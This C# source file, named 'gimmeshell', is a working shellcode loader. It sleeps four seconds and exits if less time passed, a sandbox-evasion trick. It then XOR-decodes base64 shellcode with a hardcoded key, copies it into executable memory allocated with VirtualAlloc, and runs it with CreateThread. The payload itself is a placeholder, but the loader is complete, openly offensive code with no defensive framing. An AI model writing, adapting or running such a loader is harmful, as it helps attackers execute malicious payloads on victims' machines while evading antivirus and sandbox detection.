using System;
using System.Runtime.InteropServices;
using System.Text;

namespace gimmeshell 
{
    class Program 
    {
        [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
        static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);

        [DllImport("kernel32.dll")]
        static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);

        [DllImport("kernel32.dll")]
        static extern UInt32 WaitForSingleObject(IntPtr hHandle, UInt32 dwMilliseconds);

        [DllImport("kernel32.dll")]
        static extern void Sleep(uint dwMilliseconds);

        private static byte[] xor(byte[] cipher, byte[] key) 
        {
            byte[] xored = new byte[cipher.Length];
            for (int i = 0; i < cipher.Length; i++) 
            {
                xored[i] = (byte)(cipher[i] ^ key[i % key.Length]);
            }
            return xored;
        }

        static void Main(string[] args) 
        {
            DateTime t1 = DateTime.Now;
            Sleep(4000);
            double t2 = DateTime.Now.Subtract(t1).TotalSeconds;
            if (t2 < 1.5)
            {
                return;
            }

            string key = "a70f8922029506d2e37f375fd638cdf9e2c039c8a1e6e01189eeb4efb";
            byte[] xorbuf = Convert.FromBase64String("!!BASE64CODE!!"); // You need to provide base64 encoded shellcode
            byte[] buf = xor(xorbuf, Encoding.ASCII.GetBytes(key));
            uint size = (uint)buf.Length;

            IntPtr addr = VirtualAlloc(IntPtr.Zero, size, 0x3000, 0x40); // Allocating memory
            Marshal.Copy(buf, 0, addr, buf.Length); // Copying shellcode to the allocated memory

            IntPtr hThread = CreateThread(IntPtr.Zero, 0, addr, IntPtr.Zero, 0, IntPtr.Zero); // Creating a new thread
            WaitForSingleObject(hThread, 0xFFFFFFFF); // Waiting for the created thread to terminate
        }
    }
}
